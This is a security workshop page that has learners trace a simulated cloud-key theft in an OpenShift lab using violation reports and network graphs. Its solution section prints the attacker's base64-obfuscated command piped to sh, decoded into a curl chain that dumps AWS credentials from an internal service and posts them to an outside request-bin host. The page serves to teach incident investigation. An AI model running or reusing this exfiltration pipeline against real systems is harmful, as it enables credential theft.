---
title: "Attack Flow Analysis"
draft: false
weight: 3
---

## Context

It’s December 19, 2021 (yes, you read that right, two years earlier, to the day).

The AWS Cloud Team is alerting you that an AWS API key has been compromised and used to deploy crypto mining software.
Fortunately, your company prohibits the reuse of API keys for several uses: you are therefore certain of the origin of this data leak: it is the **visa-processor** application which uses this key. API.

```
$ oc rsh -n data-theft deploy/visa-processor /bin/sh -c 'env' | fate | grep ^A
APP_ID=visa-processor
APP_ROOT=/opt/app-root
AWS_ACCESS_KEY_ID=Easy, peasy!
AWS_SECRET_ACCESS_KEY=Catch me if you can!
```

**Note**: AWS API keys were redacted in the lab to avoid an unnecessary heart attack for **Red Hat** security teams. They were replaced by two humorous messages. :)

At the same time, the network team warns you of the presence of an unusual outgoing flow destined for servers also hosted on AWS.

```
$ dig +short public.requestbin.com
54.192.137.16
54.192.137.101
54.192.137.26
54.192.137.85
```

```
$ whois 18.155.129.83 |grep OrgTechName
OrgTechName: Amazon EC2 Network Operations
```
## Objective of the exercise

Your mission, if you accept it, is to investigate the Lab environment in search of the path taken by the attacker to perpetrate this data exfiltration.
The objective is achieved when you find the URL of the **Request Bin** used by the attacker to exfiltrate the API key.

![Request Bin showing exfiltrated AWS API key](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-Request-Bin.png)

## Up to you !

Clues:

- Start with the **Violations** section and filter the view with `deployment:visa-processor namespace:data-theft`
- Switch to the **Network Graph V2** section and display the flows of the cluster **local-cluster**, namespace **data-theft**. Click on the **information-service** and **back-office** deployments and compare their flows. Which one seems most suspicious to you?
- Return to the **Violations** section and filter the view with the name of the deployment that seems most suspicious to you.

## Solution

{{%expand "Solution" %}}

Navigate to the **Violations** section and filter the view with `deployment:visa-processor namespace:data-theft`.

![visa-processor violations](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-visa-processor-violations.png)

We note the presence of CVE but nothing very suspicious.

Switch to the **Network Graph** section and view the flows from the cluster **local-cluster**, namespace **data-theft**.

Click on the **back office** deployment.

![back-office network graph](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-back-office-network-graph.png)

The observed flows appear legitimate.

Click on the **information-service** deployment.

![information-service network graph](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-network-graph.png)

Observe the inbound flow from the OpenShift router and the outbound flow to AWS.
Also note that the **information-service** deployment communicates with the **visa-processor** deployment.

Navigate to the **Violations** section and filter the view with `deployment:information-service namespace:data-theft`.

![information-services violations](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-violations.png)

Note the presence of the **Log4Shell** vulnerability as well as suspicious behavior at runtime: **Shell Spawned by Java Application**.

Click on the **Shell spawned by Java Application** violation.

![information-services violation Shell Spawned by Java Application](/OPP-2023-lab-instruction.github.io//images/Attack-Flow-Analysis-information-service-violation-shell-spawned.png)

Observe the command executed:

```
echo Y3VybCAtc2sgLWQgJ3tcIm51bWJlck9mSWRlbnRpdGllc1wiOjR9JyBodHRwOi8vdmlzYS1wcm9jZXNzb3IuZGF0YS10aGVmdC5zdmM6ODA4MC9nZXRBcHBsaWNhdGlvbklkZW50aXR5 IHwgY3VybCAtc2sgLS1kYXRhLWJpbmFyeSBALSAtSCAnQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyBodHRwczovL2VueWQxcnczcHd6M2EueC5waXBlZHJlYW0ubmV0Cg== | base64 -d | sh
```

Decode base64 encoded content (use the "base64 -d" command):

```
$ echo Y3VybCAtc2sgLWQgJ3tcIm51bWJlck9mSWRlbnRpdGllc1wiOjR9JyBodHRwOi8vdmlzYS1wcm9jZXNzb3IuZGF0YS10aGVmdC5zdmM6ODA4MC9nZXRBcHBsaWNhdGlvbklkZW50aXR 5IHwgY3VybCAtc2sgLS1kYXRhLWJpbmFyeSBALSAtSCAnQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluJyBodHRwczovL2VueWQxcnczcHd6M2EueC5waXBlZHJlYW0ubmV0Cg== | base64 -d

curl -sk -d '{\"numberOfIdentities\":4}' http://visa-processor.data-theft.svc:8080/getApplicationIdentity | curl -sk --data-binary @- -H 'Content-Type: text/plain' https://enyd1rw3pwz3a.x.pipedream.net
```

The first **curl** command exploits an application bug to retrieve the AWS API key.

Normally, the **visa-processor** component returns the value of its **APP_ID** environment variable:

```
$ curl -sk -X POST http://visa-processor.data-theft.svc:8080/getApplicationIdentity
{
    "APP_ID": "visa-processor"
}
```

But by passing an additional undocumented argument, we can retrieve the following environment variables (in alphabetical order):

```
$ curl -sk -d '{"numberOfIdentities":4}' http://visa-processor.data-theft.svc:8080/getApplicationIdentity

{
    "APP_ID": "visa-processor",
    "APP_ROOT": "/opt/app-root",
    "AWS_ACCESS_KEY_ID": "Easy, peasy!",
    "AWS_SECRET_ACCESS_KEY": "Catch me if you can!"
}
```

The second **curl** command exfiltrates data via the **Request Bin** service.
Connect to [https://enyd1rw3pwz3a.x.pipedream.net](https://enyd1rw3pwz3a.x.pipedream.net) and confirm that the exfiltrated data is present.

{{% /expand%}}
